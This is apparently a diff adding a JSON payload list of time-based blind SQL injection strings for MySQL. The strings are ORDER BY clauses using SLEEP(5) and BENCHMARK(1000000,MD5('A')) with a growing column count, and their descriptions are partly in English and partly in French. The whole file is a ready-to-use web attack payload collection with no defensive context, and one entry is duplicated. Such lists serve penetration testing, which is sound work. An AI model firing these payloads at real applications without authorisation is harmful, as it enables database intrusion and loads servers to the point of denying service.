@@ -1,0 +1,172 @@
+{
+    "payloads": [
+      {
+        "payload": "ORDER BY SLEEP(5)",
+        "description": "Injects the SLEEP function with ORDER BY clause to induce a time delay."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5)",
+        "description": "Injects a time delay using the SLEEP function with an ORDER BY clause."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",
+        "description": "Injects a time delay with SLEEP and uses BENCHMARK to create a heavy load to further induce a delay."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",
+        "description": "Expands the previous injection by adding more columns in the ORDER BY clause."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",
+        "description": "Expands the ORDER BY clause further to test multiple columns."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",
+        "description": "Continues expanding the ORDER BY clause to introduce more columns."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",
+        "description": "Increases the number of columns in the ORDER BY clause to cause additional load."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",
+        "description": "Further expands the ORDER BY clause to test the system's response to multiple columns."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",
+        "description": "Increases the ORDER BY clause and continues to induce delays with BENCHMARK and SLEEP."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",
+        "description": "Injects further columns into the ORDER BY clause with SLEEP and BENCHMARK for additional delay."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",
+        "description": "Expands the ORDER BY clause to test if the system handles increasing complexity."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",
+        "description": "Increases the columns further in the ORDER BY clause to assess the system's performance under load."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",
+        "description": "Expands the ORDER BY clause to include more columns for a longer time delay."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",
+        "description": "Injects even more columns into the ORDER BY clause to maximize the time delay."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",
+        "description": "Adds more columns and induces an even longer delay by using SLEEP and BENCHMARK."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",
+        "description": "Further expands the ORDER BY clause with additional columns and more time delay."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",
+        "description": "Tests the system with an increasing number of columns and a higher delay."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+        "description": "Expands the complexity by adding more columns in the ORDER BY clause."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+        "description": "Continues to test system performance with additional columns and longer delays."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+        "description": "Increases the delay by adding more columns in the ORDER BY clause."
+      },
+      {
+        "payload": "ORDER BY SLEEP(5)#",
+        "description": "Un simple payload pour tester l'injection SQL avec une pause de 5 secondes."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5)#",
+        "description": "Injection SQL avec une pause de 5 secondes et un tri basé sur la première colonne."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),3#",
+        "description": "Ajout d'une deuxième colonne (3) après la pause de 5 secondes pour tester la vulnérabilité."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),3,4#",
+        "description": "Ajout d'une quatrième colonne pour tester plusieurs colonnes après la pause."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
+        "description": "Injection SQL combinée avec la fonction BENCHMARK pour mesurer la performance, suivie d'un tri par colonne."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",
+        "description": "Extension de la précédente injection avec plus de colonnes et le test d'une fonction complexe comme BENCHMARK."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",
+        "description": "Ajout de plusieurs colonnes supplémentaires pour tester la gestion des multiples données après la pause."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",
+        "description": "Extension de l'injection pour augmenter la complexité avec encore plus de colonnes."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",
+        "description": "Ajout d'encore plus de colonnes après l'injection pour tester la gestion de la charge."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",
+        "description": "Un test avec 10 colonnes pour vérifier l'impact de la complexité sur la base de données."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",
+        "description": "Ajout de 11 colonnes pour tester la stabilité et la performance sous charge accrue."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",
+        "description": "Injection avec 12 colonnes pour vérifier la gestion des données et des temps de réponse."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",
+        "description": "Test de charge avec 13 colonnes après l'injection, afin de maximiser la charge SQL."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
+        "description": "Extension de la charge avec 14 colonnes supplémentaires."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
+        "description": "Nouvelle version du payload avec 14 colonnes pour valider la performance."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",
+        "description": "Ajout de la 15ème colonne pour augmenter la charge de la base de données."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",
+        "description": "Un test avec 16 colonnes, encore plus complexe."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
+        "description": "Augmenter encore la complexité avec 17 colonnes après l'injection."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+        "description": "Un payload avec 18 colonnes pour observer le comportement sous une pression accrue."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+        "description": "Test avec 19 colonnes, augmentant encore la charge sur la base."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+        "description": "Ajout de 20 colonnes pour tester la capacité de la base de données."
+      },
+      {
+        "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+        "description": "Injection SQL combinée avec un grand nombre de colonnes pour observer la stabilité."
+      }
+    ]
+  }
